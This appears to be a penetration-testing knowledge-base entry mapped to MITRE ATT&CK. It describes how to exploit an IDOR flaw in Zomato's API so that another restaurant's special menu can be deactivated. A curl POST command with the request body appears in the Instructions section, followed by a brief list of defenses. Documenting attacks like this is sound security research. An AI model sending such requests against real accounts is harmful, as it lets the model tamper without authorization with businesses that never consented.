---
tags:
  - idor
  - deactivation
  - api-exploit
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/zomato-deactivate-menu-post]]'
platforms:
  - Mobile API
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: a31a7ffd-3c48-4bc7-acf6-df10ef52f7ae
created_at: '2025-12-14T17:25:29.747Z'
updated_at: '2025-12-14T17:25:29.747Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Deactivate Special Menu via IDOR

## Summary

This procedure exploits the IDOR by sending a POST request to deactivate a special menu using arbitrary user_id and menu_set_id, bypassing ownership verification.

## Description

The final step uses the JS snippet structure to POST to XXX/XXXXXX with request_type:"deactivate-special-menu". Tested on Zomato's test restaurant, it deactivates menus active until specific dates, disrupting offerings.

## Requirements

1. menu_set_id, user_id, and res_id from prior steps
2. Valid access_token
3. JSON-aware HTTP client

## Defense

Defensive measures and detection strategies:

- Enforce strict ownership checks on deactivation endpoints
- Require multi-factor confirmation for menu changes
- Real-time monitoring and alerts for deactivation events

## Objectives

1. Deactivate arbitrary restaurant's special menu
2. Demonstrate full IDOR impact
3. Validate exploit success

## Instructions

### Step 1: Construct Deactivation Request

**Context**: Use IDs to target a menu.

**Command** ([[commands/zomato-deactivate-menu-post]]):
```bash
curl -X POST "https://api.zomato.com/XXX/XXXXXX" \
  -H "Content-Type: application/json" \
  -d '{"request_type":"deactivate-special-menu","user_id":USER_ID,"menu_set_id":XXXX}'
```

> Expected output: Confirmation of deactivation (e.g., menu inactive until Sep 24).

### Step 2: Verify Deactivation

**Context**: Re-query to confirm change.

> Send get-special-menus request; check status.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/zomato-deactivate-menu-post]]

## Tools Used


## Tags

- [[idor]]
- [[deactivation]]
